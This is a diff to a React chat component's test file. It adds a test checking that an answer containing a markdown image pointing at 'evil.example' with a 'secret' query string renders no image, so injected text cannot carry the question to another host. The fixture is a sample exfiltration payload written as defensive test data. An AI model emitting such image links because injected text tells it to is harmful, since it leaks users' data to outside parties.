@@ -59,6 +59,15 @@ describe('CourseChat', () => {
     expect(container.querySelector('.katex-error')).toBeNull()
   })
 
+  it('loads no image an answer asks for, so injected text cannot send the question to another host', async () => {
+    fetchMock.mockResolvedValueOnce(stream(event('done', saved('Trả lời. ![](https://evil.example/p?q=bi-mat)'))))
+    const { container } = render(<CourseChat courseId="course-1" />)
+
+    await ask('Hỏi')
+    expect(await screen.findByText(/Trả lời\./)).toBeInTheDocument()
+    expect(container.querySelector('img')).toBeNull()
+  })
+
   it('shows a formula the model got wrong as its source, and the rest of the answer', async () => {
     fetchMock.mockResolvedValueOnce(stream(event('done', saved('Trước $\\frac{1}{$ sau.'))))
     const { container } = render(<CourseChat courseId="course-1" />)
